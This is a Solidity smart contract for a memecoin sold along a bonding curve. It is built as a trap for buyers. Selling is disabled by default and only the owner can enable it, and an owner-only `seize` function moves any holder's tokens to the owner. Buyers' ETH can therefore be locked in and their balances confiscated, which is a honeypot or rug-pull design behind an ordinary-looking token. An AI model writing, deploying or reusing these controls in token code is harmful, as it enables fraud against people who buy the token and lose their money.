// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Memecoin {
    string public name = "latest stupid meme";
    string public symbol = "meme";
    uint8 public decimals = 18;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    address public owner;
    bool public sellsEnabled = false;

    uint256 public constant BASE_PRICE = 1e14; // 0.0001 ETH
    uint256 public constant INCREMENT = 5e13;  // 0.00005 ETH per token increase

    event Buy(address indexed buyer, uint256 ethSpent, uint256 tokensMinted);
    event Sell(address indexed seller, uint256 tokensBurned, uint256 ethReceived);
    event Seized(address indexed target, uint256 amount);
    event OwnershipRenounced(address indexed previousOwner);
    event SellEnabled(bool enabled);
    event DustWithdrawn(address to, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    // --- Buy tokens ---
    function buy() external payable {
        require(msg.value > 0, "Send ETH to buy");

        uint256 tokensToMint = previewBuyTokens(msg.value);
        require(tokensToMint > 0, "Not enough ETH for 1 token");

        uint256 cost = getBuyCost(tokensToMint);
        require(msg.value >= cost, "Insufficient ETH");

        balanceOf[msg.sender] += tokensToMint;
        totalSupply += tokensToMint;

        emit Buy(msg.sender, cost, tokensToMint);

        if (msg.value > cost) {
            payable(msg.sender).transfer(msg.value - cost);
        }
    }

    // --- Sell tokens (only if enabled) ---
    function sell(uint256 amount) external {
        require(sellsEnabled, "Selling is disabled");
        require(balanceOf[msg.sender] >= amount, "Not enough tokens");
        require(amount > 0, "Cannot sell 0");

        uint256 refund = getSellValue(amount);

        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;

        emit Sell(msg.sender, amount, refund);
        payable(msg.sender).transfer(refund);
    }

    // --- Admin functions ---

    function seize(address target, uint256 amount) external onlyOwner {
        require(balanceOf[target] >= amount, "Target has insufficient balance");
        balanceOf[target] -= amount;
        balanceOf[owner] += amount;
        emit Seized(target, amount);
    }

    function setSellEnabled(bool enabled) external onlyOwner {
        sellsEnabled = enabled;
        emit SellEnabled(enabled);
    }

    function withdrawDust() external onlyOwner {
        require(totalSupply == 0, "Must burn all tokens first");
        uint256 amt = address(this).balance;
        payable(owner).transfer(amt);
        emit DustWithdrawn(owner, amt);
    }

    function renounceOwnership() external onlyOwner {
        emit OwnershipRenounced(owner);
        owner = address(0);
    }

    // -------- Bonding Curve Math --------

    function getBuyCost(uint256 tokens) public view returns (uint256) {
        uint256 n = tokens / 1e18;
        uint256 S = totalSupply / 1e18;
        return (n * BASE_PRICE) + INCREMENT * ((S * n) + (n * (n - 1)) / 2);
    }

    function getSellValue(uint256 tokens) public view returns (uint256) {
        require(sellsEnabled, "Selling disabled"); // view function also locked if off
        uint256 n = tokens / 1e18;
        uint256 S = totalSupply / 1e18;
        require(n <= S, "Invalid sell amount");
        return (n * BASE_PRICE) + INCREMENT * ((S * n) - (n * (n + 1)) / 2);
    }

    function previewBuyTokens(uint256 eth) public view returns (uint256) {
        uint256 low = 0;
        uint256 high = 1000;
        while (low < high) {
            uint256 mid = (low + high + 1) / 2;
            if (getBuyCost(mid * 1e18) <= eth) {
                low = mid;
            } else {
                high = mid - 1;
            }
        }
        return low * 1e18;
    }

    function previewSellValue(uint256 tokens) public view returns (uint256) {
        if (!sellsEnabled) return 0;
        return getSellValue(tokens);
    }
}
